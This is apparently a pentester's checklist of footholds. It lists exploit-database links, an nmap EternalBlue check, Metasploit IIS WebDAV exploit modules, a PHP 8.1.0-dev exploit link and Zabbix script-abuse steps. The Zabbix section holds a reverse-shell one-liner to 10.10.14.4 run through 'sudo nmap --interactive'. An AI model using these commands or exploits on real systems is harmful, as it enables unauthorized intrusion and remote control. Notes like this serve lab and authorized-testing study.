# Footholds

## Exploits

1. [Trickest](https://github.com/trickest/cve)
2. [Exploit-DB](https://www.exploit-db.com/)

## Jenkins

- [ ] Jenkins Administrator - Add build shell
- [ ] 

## SMB

- [ ] Check Eternal Blue `nmap -p445 --script smb-vuln-ms17-010 IP` or `auxiliary/scanner/smb/smb_ms17_010`
    - [ ] Exploitation: 

## Tomcat

## JBOSS

## Elastix

- [ ] 

## PHP

- [ ] [PHP 8.1.0-dev](https://www.exploit-db.com/exploits/49933)

## IIS

- [ ] IIS 6.0
    - [ ] `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
    - [ ] `exploit/windows/iis/iis_webdav_upload_asp`


## Zabbix

```bash
id
whoami
uname -a
echo "Using at to schedule reverse shell execution.."
echo 'echo "!/bin/bash -i >& /dev/tcp/10.10.14.4/80 0>&1"|sudo nmap --interactive'
```

- [ ] [CVE-2022-23131](https://github.com/trganda/CVE-2022-23131)
- [ ] Add new [script](https://medium.com/@0x616163/pivoting-with-devops-tools-abusing-zabbix-877e92bf49c2) shell command
- [ ] Hosts > Host to execute > Select Script and execute 
